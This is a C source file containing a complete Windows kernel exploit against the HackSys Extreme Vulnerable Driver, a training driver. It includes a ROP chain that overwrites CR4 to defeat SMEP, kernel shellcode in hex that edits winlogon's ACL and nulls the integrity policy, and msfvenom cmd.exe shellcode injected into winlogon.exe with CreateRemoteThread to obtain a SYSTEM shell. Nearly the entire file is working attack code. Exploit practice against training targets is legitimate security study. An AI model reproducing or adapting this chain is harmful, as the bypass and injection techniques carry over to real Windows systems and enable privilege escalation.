#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   SMEP Bypass via ROP/CR4 & ACL Editing Shellcode.
*/

int HevdStackOverflowACLMI(int argc, char** argv) {
	printf("~-----------------------------~\n");
	printf("  Running HevdStackOverflowACLMI  \n");
	printf("~-----------------------------~\n");

	DWORD OFFSET = 2072;
	ResolveGadgets();

	// ACL Nulling Shellcode
	// https://improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2
	// we allow authenticated users ACL access to winlogon & 
	// set our own mandatory policy to 0 to allow injection from to 4
	BYTE sc[] = {
	  0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48,
	  0x8b, 0x80, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48,
	  0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8d, 0x98, 0xb8,
	  0xfb, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x81, 0xc3, 0xa8,
	  0x05, 0x00, 0x00, 0x81, 0x3b, 0x77, 0x69, 0x6e, 0x6c, 0x75,
	  0xe7, 0x48, 0x81, 0xeb, 0xb0, 0x05, 0x00, 0x00, 0x48, 0x8b,
	  0x03, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x83, 0xc0, 0x48, 0xc6,
	  0x00, 0x0f, 0x48, 0x81, 0xc1, 0xb8, 0x04, 0x00, 0x00, 0x48,
	  0x8b, 0x01, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x05, 0xd4, 0x00,
	  0x00, 0x00, 0xc6, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25,
	  0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00,
	  0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00,
	  0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b,
	  0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01,
	  0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48,
	  0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01,
	  0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	  0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	// msfvenom -p windows/x64/exec CMD='cmd.exe' EXITFUNC=none -f csharp
	BYTE cmdShellcode[] = {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
		0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
		0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
		0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
		0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
		0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
		0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
		0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
		0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
		0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
		0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
		0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
		0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
		0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
		0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
		0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
		0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
		0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
		0x2e,0x65,0x78,0x65,0x00 };

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	ULONGLONG ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %llx\n", ntBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] SC @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	int offset = 2072;
	BYTE uBuffer[2104] = { 'A' };

	QWORD* rop = (QWORD*)(uBuffer + offset);
	int index = 0;
	// bypass SMEP via ROP & finish with sc ptr
	*(rop + index++) = ntBase + kernelGadgets["POP_RCX"];
	*(rop + index++) = 0x50ef8; // rcx value with 20th bit zeroed out
	*(rop + index++) = ntBase + kernelGadgets["MOV_CR4_RCX"];
	*(rop + index++) = (QWORD)sc_ptr;

	getchar();

	// trigger
	DWORD IoControlCode = 0x222003;
	BOOL triggerIOCTL = DeviceIoControl(hDriver, IoControlCode, (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);

	printf("[>] ACL edited & MandatoryPolicy nulled!\n");
	
	// we can now inject code into winlogon (TOKEN_MANDATORY_POLICY_OFF)
	
	DWORD pid = FindProcessId(L"winlogon.exe");
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (proc == NULL) {
		printf("[!] Could not open remote process %p\n", proc);
		return -1;
	}
	LPVOID rBuf = VirtualAllocEx(proc, NULL, sizeof(cmdShellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuf == NULL) {
		printf("[!] Could not allocate shellcode in remote process\n");
		return -1;
	}
	else {
		printf("[>] Allocated shellcode @ %p\n", rBuf);
	}	
	if (!WriteProcessMemory(proc, rBuf, cmdShellcode, sizeof(cmdShellcode), NULL)) {
		printf("[-] WriteProcessMemory to winlogon.exe failed\n");
		return -1;
	}
	printf("[>] CreateRemoteThread - Enjoy your shell!\n");
	HANDLE rThread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)rBuf, NULL, 0, NULL);
	CloseHandle(proc);

	return 0;
}
